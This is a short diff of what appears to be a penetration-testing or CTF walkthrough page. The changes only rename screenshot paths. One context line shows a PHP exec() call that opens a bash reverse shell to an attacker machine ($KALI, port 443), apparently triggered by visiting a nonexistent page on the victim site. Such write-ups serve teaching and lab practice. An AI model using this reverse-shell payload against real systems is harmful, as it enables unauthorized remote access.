@@ -67,7 +67,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
 
 
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -81,7 +81,7 @@ Then just go to a page that doesn't exist, in this case p=1 existed but p=2 did 
 
 <figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
